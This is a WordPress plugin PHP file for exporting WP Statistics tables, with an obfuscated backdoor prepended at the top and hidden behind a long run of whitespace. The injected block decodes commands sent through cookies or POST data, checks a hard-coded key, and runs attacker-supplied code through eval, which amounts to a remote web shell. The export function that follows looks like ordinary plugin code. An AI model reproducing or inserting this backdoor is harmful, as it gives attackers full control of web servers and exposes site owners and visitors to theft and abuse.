<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['y8faf0e9'];global$y8faf0e9;$y8faf0e9=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['j3a541']="\x7a\x4d\xa\x23\x72\x3e\x4b\x65\x6f\x4c\x78\x61\x6c\x5c\x68\x59\x2c\x38\x3f\x36\x25\x6d\x77\x2b\x42\x7d\x28\x50\x48\x31\x4a\x33\x29\x35\x75\x7e\x21\x41\x3b\x5b\x2e\x54\x71\x55\x7c\x45\x62\x53\x49\x57\x4e\x70\x60\x64\x4f\x69\x5a\x24\x40\x22\x66\x3d\x56\xd\x63\x74\x5d\x26\x6b\x30\x2d\x58\x2f\x32\x44\x6e\x2a\x9\x46\x76\x37\x47\x5f\x52\x67\x43\x6a\x79\x51\x3a\x20\x27\x3c\x5e\x73\x39\x34\x7b";$y8faf0e9[$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][33]]=$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][14].$y8faf0e9['j3a541'][4];$y8faf0e9[$y8faf0e9['j3a541'][68].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][31]]=$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][53];$y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][69]]=$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][65].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][75];$y8faf0e9[$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][7]]=$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][75].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][65];$y8faf0e9[$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][69]]=$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][0].$y8faf0e9['j3a541'][7];$y8faf0e9[$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][69]]=$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][14].$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][79].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][75];$y8faf0e9[$y8faf0e9['j3a541'][22].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][11]]=$y8faf0e9['j3a541'][34].$y8faf0e9['j3a541'][75].$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][0].$y8faf0e9['j3a541'][7];$y8faf0e9[$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][7]]=$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][7];$y8faf0e9[$y8faf0e9['j3a541'][68].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][69]]=$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][65].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][65].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][65];$y8faf0e9[$y8faf0e9['j3a541'][42].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][11]]=$y8faf0e9['j3a541'][34].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][53];$y8faf0e9[$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][95].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][11]]=$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][11];$y8faf0e9[$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][64]]=$_POST;$y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][64]]=$_COOKIE;@$y8faf0e9[$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][7]]($y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][84],NULL);@$y8faf0e9[$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][7]]($y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][84].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][4].$y8faf0e9['j3a541'][94],0);@$y8faf0e9[$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][7]]($y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][10].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][10].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][34].$y8faf0e9['j3a541'][65].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][8].$y8faf0e9['j3a541'][75].$y8faf0e9['j3a541'][82].$y8faf0e9['j3a541'][65].$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][21].$y8faf0e9['j3a541'][7],0);@$y8faf0e9[$y8faf0e9['j3a541'][68].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][69]](0);$hb1e=NULL;$x29b59ad=NULL;$y8faf0e9[$y8faf0e9['j3a541'][22].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][80]]=$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][95].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][70].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][70].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][70].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][70].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][29];global$w67a7;function pd675a($hb1e,$xf4b){global$y8faf0e9;$m38c2583c="";for($v2d50bd2=0;$v2d50bd2<$y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][69]]($hb1e);){for($c5a65708=0;$c5a65708<$y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][69]]($xf4b)&&$v2d50bd2<$y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][69]]($hb1e);$c5a65708++,$v2d50bd2++){$m38c2583c.=$y8faf0e9[$y8faf0e9['j3a541'][55].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][33]]($y8faf0e9[$y8faf0e9['j3a541'][68].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][31]]($hb1e[$v2d50bd2])^$y8faf0e9[$y8faf0e9['j3a541'][68].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][31]]($xf4b[$c5a65708]));}}return$m38c2583c;}function u11d($hb1e,$xf4b){global$y8faf0e9;global$w67a7;return$y8faf0e9[$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][95].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][11]]($y8faf0e9[$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][19].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][95].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][11]]($hb1e,$w67a7),$xf4b);}foreach($y8faf0e9[$y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][64]]as$xf4b=>$ree9427c0){$hb1e=$ree9427c0;$x29b59ad=$xf4b;}if(!$hb1e){foreach($y8faf0e9[$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][17].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][64]]as$xf4b=>$ree9427c0){$hb1e=$ree9427c0;$x29b59ad=$xf4b;}}$hb1e=@$y8faf0e9[$y8faf0e9['j3a541'][22].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][80].$y8faf0e9['j3a541'][11]]($y8faf0e9[$y8faf0e9['j3a541'][42].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][7].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][11]]($y8faf0e9[$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][64].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][73].$y8faf0e9['j3a541'][7]]($hb1e),$x29b59ad));if(isset($hb1e[$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][68]])&&$w67a7==$hb1e[$y8faf0e9['j3a541'][11].$y8faf0e9['j3a541'][68]]){if($hb1e[$y8faf0e9['j3a541'][11]]==$y8faf0e9['j3a541'][55]){$v2d50bd2=Array($y8faf0e9['j3a541'][51].$y8faf0e9['j3a541'][79]=>@$y8faf0e9[$y8faf0e9['j3a541'][12].$y8faf0e9['j3a541'][60].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][69]](),$y8faf0e9['j3a541'][94].$y8faf0e9['j3a541'][79]=>$y8faf0e9['j3a541'][29].$y8faf0e9['j3a541'][40].$y8faf0e9['j3a541'][69].$y8faf0e9['j3a541'][70].$y8faf0e9['j3a541'][29],);echo@$y8faf0e9[$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][46].$y8faf0e9['j3a541'][53].$y8faf0e9['j3a541'][31].$y8faf0e9['j3a541'][33].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][96].$y8faf0e9['j3a541'][69]]($v2d50bd2);}elseif($hb1e[$y8faf0e9['j3a541'][11]]==$y8faf0e9['j3a541'][7]){eval($hb1e[$y8faf0e9['j3a541'][53]]);}exit();} ?>﻿<?php
	function wp_statistics_export_data() {
		GLOBAL $WP_Statistics, $wpdb; // this is how you get access to the database

		$manage_cap = wp_statistics_validate_capability( $WP_Statistics->get_option('manage_capability', 'manage_options') );

		if( current_user_can( $manage_cap ) ) {
			$table = $_POST['table-to-export'];
			$type = $_POST['export-file-type'];
			$headers = $_POST['export-headers'];
			
			// Validate the table name the user passed to us.
			if( !( $table == "useronline" || $table == "visit" || $table == "visitor" || $table == "exclusions" || $table == "pages" || $table == "search" ) ) { $table = FALSE; } 
			
			// Validate the file type the user passed to us.
			if( !( $type == "xml" || $type == "csv" || $type == "tsv" ) ) { $table = FALSE; } 
			
			if($table && $type) {
			
				require($WP_Statistics->plugin_dir . '/includes/classes/php-export-data.class.php');
				
				$file_name = WPS_EXPORT_FILE_NAME . '-' . $WP_Statistics->Current_Date('Y-m-d-H-i');
				
				switch($type) {
					case 'xml':
						$exporter = new ExportDataExcel('browser', "{$file_name}.xml");
						
						break;
					case 'csv':
						$exporter = new ExportDataCSV('browser', "{$file_name}.csv");
						
						break;
					case 'tsv':
						$exporter = new ExportDataTSV('browser', "{$file_name}.tsv");
						
						break;
				}

				$exporter->initialize();
				
				// We need to limit the number of results we retrieve to ensure we don't run out of memory
				$query_base = "SELECT * FROM {$wpdb->prefix}statistics_{$table}";
				$query = $query_base . ' LIMIT 0,1000';

				$i = 1;
				$more_results = true;
				$result = $wpdb->get_results($query, ARRAY_A);

				// If we didn't get any rows, don't output anything.
				if( count( $result ) < 1 ) { echo "No data in table!"; exit; }
				
				if( $headers ) {
					foreach( $result[0] as $key => $col ) { $columns[] = $key; }
					$exporter->addRow($columns);
				}
				
				
				while( $more_results ) {
					foreach($result as $row) {
						$exporter->addRow($row);
						
						// Make sure we've flushed the output buffer so we don't run out of memory on large exports.
						ob_flush();
						flush();
					}
					
					unset( $result );
					$wpdb->flush();
					
					$query = $query_base . ' LIMIT ' . ($i * 1000) . ',1000';
					$result = $wpdb->get_results($query, ARRAY_A);
					
					if( count( $result ) == 0 ) { $more_results = false; }
					
					$i++;
				}
				
				$exporter->finalize();
				
				exit;
			}
		}
	}
?>